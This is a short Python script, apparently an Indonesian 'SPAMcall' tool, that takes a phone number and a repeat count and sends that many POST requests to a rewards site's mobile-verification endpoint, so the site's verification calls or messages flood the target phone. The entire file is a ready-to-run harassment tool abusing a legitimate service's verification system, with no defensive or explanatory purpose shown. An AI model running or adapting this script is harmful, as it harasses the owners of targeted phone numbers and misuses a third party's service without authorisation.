import os,sys,requests,json

os.system('clear')
banner = '''
---------------------------------
         SPAMcall x tai
---------------------------------

AUTHOR : AZRIL X WIBU 
YOUTUBE : MR DARK & PEJUANG KENTANG :V
'''
print (banner)
no=input('nomor : ')
jm=int(input('Jumlah : '))

url="https://id.jagreward.com/member/verify-mobile/"
for i in range (int(jm)):
   res = requests.post(url+no)
   xp = json.loads(res.text)
   if xp["result"]==1:
      print ('[√] Spaming Sukses |')
   else :
      print ('[x] Spaming Gagal |')
